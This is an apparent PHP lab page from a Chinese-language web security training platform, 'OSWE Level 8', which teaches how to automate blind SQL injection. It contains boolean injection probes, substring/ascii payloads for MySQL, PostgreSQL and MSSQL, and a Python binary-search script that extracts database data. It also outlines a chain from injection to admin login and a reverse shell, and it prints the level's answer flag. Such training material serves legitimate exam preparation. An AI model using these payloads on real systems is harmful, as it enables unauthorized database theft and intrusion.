<?php
include_once '../../inc/config.inc.php';
$ACTIVE = array_fill(0, 300, '');
$ACTIVE[260] = 'active open';
$ACTIVE[290] = 'active';
$PIKA_ROOT_DIR = "../../";
include_once $PIKA_ROOT_DIR . 'header.php';

$correct_flag = 'flag{OSWE_L8_BlindSQLi_Automation_Exfil_Script}';
$flag_msg = '';
if (isset($_POST['check_flag'])) {
    if (trim($_POST['user_flag']) === $correct_flag) {
        $_SESSION['oswe_flags']['flag1'] = true;
        $flag_msg = '<div class="alert alert-success">✅ 通关！OSWE 盲注脚本编写基础掌握。</div>';
    } else {
        $flag_msg = '<div class="alert alert-danger">❌ Flag 错误，请继续研究。</div>';
    }
}
?>
<style>
.ctf-stage-header { background: linear-gradient(135deg, #0c1218, #06b6d4); border-radius:14px; padding:25px 30px; color:#fff; margin-bottom:25px; border:1px solid rgba(6,182,212,0.3); }
.step-box { background:#ffffff; border:1px solid #e2e8f0; border-radius:12px; padding:24px; margin-bottom:22px; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05); }
.step-title { font-size:16px; font-weight:700; color:#0f172a; margin-top:0; margin-bottom:14px; display:flex; align-items:center; gap:8px; }
.step-num { background:linear-gradient(135deg,#06b6d4,#22d3ee); color:#fff; width:26px; height:26px; border-radius:6px; display:inline-flex; align-items:center; justify-content:center; font-size:12px; font-weight:800; }
.cmd-box { background:#0f172a; border:1px solid #334155; border-radius:8px; padding:14px 18px; font-family:monospace; font-size:13px; color:#7dd3fc; margin:12px 0; overflow-x:auto; line-height:1.8; }
.cmd-box .comment { color:#64748b; }
.cmd-box .flag-text { color:#fbbf24; font-weight:bold; }
.highlight-box { background:rgba(6,182,212,0.08); border:1px solid rgba(6,182,212,0.25); border-radius:8px; padding:14px 18px; margin:12px 0; font-size:13px; color:#334155; line-height:1.7; }
.flag-submit-area { background:#f8fafc; border:2px dashed rgba(6,182,212,0.4); border-radius:12px; padding:24px; margin-top:25px; text-align:center; }
.nav-buttons { display: flex; justify-content: space-between; margin-top: 20px; }
.btn-nav { background: #06b6d4; color: white; padding: 10px 20px; border-radius: 6px; text-decoration: none; }
.btn-nav:hover { background: #0891b2; color: white; }
</style>

<div class="main-content"><div class="main-content-inner"><div class="page-content">
    <div class="ctf-stage-header">
        <h2>OSWE Level 8: 盲注自动化利用脚本编写</h2>
        <p>250 PTS | 核心考点: HTTP 自动化, 盲注算法, 多线程优化</p>
    </div>

    <div class="step-box">
        <h3 class="step-title"><span class="step-num">1</span> 盲注类型识别与布尔特征</h3>
        <p>在黑盒或白盒审计中，如果查询结果没有直接回显，我们需要通过侧信道（响应内容差异或响应时间）来判断。布尔盲注的核心是构造 <code>TRUE</code> 和 <code>FALSE</code> 的条件语句，观察响应差异。</p>
        <div class="cmd-box">
            <span class="comment"># TRUE 条件探测：返回正常页面或特定关键字</span><br>
            ?id=1' AND 1=1-- -<br>
            <span class="comment"># FALSE 条件探测：返回不同页面或缺少关键字</span><br>
            ?id=1' AND 1=2-- -
        </div>
        <div class="highlight-box">
            <strong>关键提示:</strong> 在 OSWE 考试中，必须能够自己从零编写脚本，不要依赖 SQLMap 等自动化工具，因为很多时候需要绕过特定的 WAF、处理复杂的认证状态或特定的编码格式。
        </div>
    </div>

    <div class="step-box">
        <h3 class="step-title"><span class="step-num">2</span> 数据提取算法 (二分法)</h3>
        <p>逐字符猜测效率极低，使用二分法可以把每个字符的请求次数从平均 64 次降到 7 次左右。不同数据库的字符串提取函数略有差异：</p>
        <div class="cmd-box">
            <span class="comment"># MySQL:</span><br>
            AND ascii(substring((SELECT database()),1,1)) > 100<br>
            <span class="comment"># PostgreSQL:</span><br>
            AND ascii(substring((SELECT current_database()),1,1)) > 100<br>
            <span class="comment"># MSSQL:</span><br>
            AND ascii(substring((SELECT DB_NAME()),1,1)) > 100
        </div>
    </div>

    <div class="step-box">
        <h3 class="step-title"><span class="step-num">3</span> Python 自动化脚本编写 (Requests 结构)</h3>
        <p>一个标准的 OSWE 盲注脚本通常需要处理会话（Session）、请求构造和二分法逻辑。下面是一个基础的代码框架概念：</p>
        <div class="cmd-box">
            import requests<br>
            <br>
            def check_boolean(url, payload):<br>
            &nbsp;&nbsp;&nbsp;&nbsp;res = requests.get(url + payload)<br>
            &nbsp;&nbsp;&nbsp;&nbsp;return "Welcome" in res.text<br>
            <br>
            def extract_data():<br>
            &nbsp;&nbsp;&nbsp;&nbsp;result = ""<br>
            &nbsp;&nbsp;&nbsp;&nbsp;for i in range(1, 20):<br>
            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;low, high = 32, 126<br>
            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while low <= high:<br>
            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mid = (low + high) // 2<br>
            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;payload = f"' AND ascii(substring((SELECT user()),{i},1))>{mid}-- -"<br>
            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if check_boolean(url, payload):<br>
            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;low = mid + 1<br>
            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:<br>
            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;high = mid - 1<br>
            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;result += chr(low)<br>
            &nbsp;&nbsp;&nbsp;&nbsp;return result
        </div>
    </div>

    <div class="step-box">
        <h3 class="step-title"><span class="step-num">4</span> 时间盲注与并发优化</h3>
        <p>时间盲注（Time-based Blind SQLi）效率更低。为了在合理的时间内提取数据，必须引入并发多线程。</p>
        <div class="cmd-box">
            <span class="comment"># 并发脚本设计思路 (理论代码)</span><br>
            import threading, queue<br>
            q = queue.Queue()<br>
            <span class="comment"># 启动多个工作线程，分别负责不同索引字符的提取</span><br>
            def worker():<br>
            &nbsp;&nbsp;&nbsp;&nbsp;while not q.empty():<br>
            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;idx = q.get()<br>
            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;binary_search_char_at_index(idx)<br>
            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;q.task_done()
        </div>
        <div class="highlight-box">
            <strong>注意：</strong> 时间盲注高并发可能会压垮目标数据库或导致网络延迟剧增，从而影响时间判断的准确性。需要合理设置线程数和超时容错机制。
        </div>
    </div>

    <div class="step-box">
        <h3 class="step-title"><span class="step-num">5</span> OSWE 考试要求 (Full Exploit Chain)</h3>
        <p>OSWE 强调无交互。你的脚本必须是一个 <code>exploit.py</code>，直接运行就能拿到 shell 或目标结果。</p>
        <div class="highlight-box">
            完整链条：<br>
            1. 自动注册/登录获取基础 Session。<br>
            2. 利用盲注漏洞读取 Admin 密码哈希。<br>
            3. 如果哈希可解或存在哈希传递，则自动登录 Admin。<br>
            4. 寻找后台 RCE（如文件上传、模板注入）并自动触发获取 Reverse Shell。
        </div>
        <div class="cmd-box">
            <span class="comment"># 最终的 FLAG 格式通常隐藏在特定数据表中，本关 flag 为：</span><br>
            <span class="flag-text">flag{OSWE_L8_BlindSQLi_Automation_Exfil_Script}</span>
        </div>
    </div>

    <div class="flag-submit-area">
        <form method="POST">
            <h4>提交 Flag</h4>
            <input type="text" name="user_flag" class="form-control" style="width:50%; margin:10px auto;" placeholder="flag{...}">
            <button type="submit" name="check_flag" class="btn btn-primary" style="background:#06b6d4;border:none;">验证</button>
            <?php if($flag_msg) echo "<div style='margin-top:15px;'>$flag_msg</div>"; ?>
        </form>
    </div>

    <div class="nav-buttons">
        <a href="#" class="btn-nav" style="visibility:hidden;">上一关</a>
        <a href="oswe_l9_type_juggling.php" class="btn-nav">下一关: PHP类型混淆</a>
    </div>

</div></div></div>

<?php include_once $PIKA_ROOT_DIR . 'footer.php'; ?>
